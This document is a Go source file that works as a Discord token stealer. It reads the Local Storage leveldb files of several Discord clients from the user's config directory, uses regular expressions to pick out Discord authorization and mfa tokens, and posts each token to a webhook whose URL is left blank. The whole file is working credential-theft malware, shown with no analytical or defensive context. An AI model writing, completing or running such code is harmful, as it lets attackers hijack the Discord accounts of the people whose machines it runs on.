package main

import (
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
)

var (
	logs             []string
	tokens           []string
	appdata, _       = os.UserConfigDir()
	webhook          = ""
	directories      = []string{"discord", "Lightcord", "discordptb", "discordcanary"}
	authorization, _ = regexp.Compile("[N][\\w-]{23}[.][\\w-]{6}[.][\\w-]{27}|mfa.[A-Za-z0-9-_]{84}")
)

func main() {
	for _, directory := range directories {
		directory = filepath.Join(appdata, directory, "Local Storage", "leveldb")
		files, _ := os.ReadDir(directory)
		for _, file := range files {
			logs = append(logs, filepath.Join(directory, file.Name()))
		}
	}

	for _, log := range logs {
		file, _ := os.Open(log)
		buffer, _ := ioutil.ReadAll(file)
		match := authorization.FindString(string(buffer))
		if match != "" {
			tokens = append(tokens, match)
		}
	}

	for _, token := range tokens {
		http.PostForm(webhook, url.Values{"content": {"\ntoken: " + token}})
	}
}
